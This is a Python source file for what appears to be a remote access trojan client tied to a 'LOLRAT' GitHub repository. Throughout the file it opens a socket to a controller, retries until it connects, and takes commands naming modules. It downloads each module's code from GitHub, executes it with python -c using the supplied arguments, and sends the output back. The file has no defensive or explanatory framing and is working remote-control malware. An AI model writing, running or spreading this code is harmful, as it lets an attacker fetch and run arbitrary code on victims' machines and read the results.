import os
import socket
import subprocess
import requests
import time

def fetch_url_and_execute_cmd(url, args):
    try:
        response = requests.get(url)
        content = response.text if response.status_code == 200 else f'Failed to retrieve content from the URL. Status Code: {response.status_code}'
        command = ['python', '-c', content, *args]
        result = subprocess.run(command, capture_output=True, text=True)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f'An error occurred: {e}'

host, port = '127.0.0.1', 12345

while True:
    try:
        with socket.create_connection((host, port)) as client_socket:
            print('Connected to the server')
            while True:
                command = client_socket.recv(1024).decode('utf-8').split("$")
                url, args = f'https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/{command[0]}.py', [command[1]]
                output = fetch_url_and_execute_cmd(url, args)
                client_socket.send(output.encode('utf-8'))
    except ConnectionRefusedError:
        print('Connection refused. Retrying in 5 seconds...')
        time.sleep(5)
    except Exception as e:
        print(f'An error occurred: {e}')
